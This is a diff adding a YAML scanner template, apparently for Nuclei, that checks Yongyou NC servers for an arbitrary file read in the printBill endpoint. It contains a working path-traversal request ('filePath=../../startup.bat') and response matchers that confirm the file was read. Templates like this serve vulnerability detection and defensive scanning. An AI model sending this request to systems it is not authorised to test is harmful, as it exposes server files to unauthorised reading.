@@ -1,0 +1,28 @@
+id: yongyou-nc-printbill-file-read
+info:
+  name: Yongyou NC printBill Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read, yongyou, nc
+  description: |
+    Yongyou NC printBill endpoint allows arbitrary file reading due to improper file path sanitization.
+http:
+  - raw:
+      - |
+        GET /portal/pt/printpdf/printBill?pageId=login&filePath=../../startup.bat HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "application/pdf"
+      - type: word
+        part: body
+        words:
+          - "NC_HOME"
+          - ".bat"
+          - "@echo off"
